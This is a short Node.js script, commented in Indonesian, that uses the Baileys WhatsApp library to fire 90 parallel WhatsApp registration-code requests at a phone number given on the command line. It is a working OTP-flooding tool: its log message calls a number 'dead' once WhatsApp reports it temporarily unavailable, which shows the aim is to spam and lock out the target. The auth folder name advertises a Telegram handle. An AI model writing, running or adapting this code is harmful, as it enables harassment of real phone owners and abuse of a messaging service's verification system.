const fs = require('fs');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');

const start = async (phoneNumber, countryCode) => {
    const { state } = await useMultiFileAuthState('t.me/justkeepp');
    const sock = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const ReqOTP = async (phoneNumber, countryCode, number) => {
        try {
            const res = await sock.requestRegistrationCode({
                phoneNumber: phoneNumber.replace(/\+/g, ''),
                phoneNumberCountryCode: countryCode,
                phoneNumberNationalNumber: number,
                phoneNumberMobileCountryCode: 724
            });
            console.log(`Sended`); // Abaikan, ini cuman log kalo otp nya kekirim
            return res;
        } catch (error) {
            if (error.reason && error.reason === 'temporarily_unavailable') {
                console.log(`Nomer ${countryCode}${phoneNumber} Udah koit`);
            } else {
                console.log(`Proses Request OTP ke ${countryCode}${phoneNumber}:`, error);
            }
            throw error;
        }
    };

    return ReqOTP(phoneNumber, countryCode, phoneNumber);
};

const main = async () => {           
    const args = process.argv.slice(2); // Mengambil argumen dari terminal
    const [countryCode, phoneNumber] = args; // Mengurai kode negara dan nomor telepon dari argumen

    if (!countryCode || !phoneNumber) {
        console.log('Invalid Input. Contoh : "+62 88877776666"');
        return;
    }

    const numRequests = 90;
    const requests = Array.from({ length: numRequests }, () => start(phoneNumber, countryCode));

};

main();
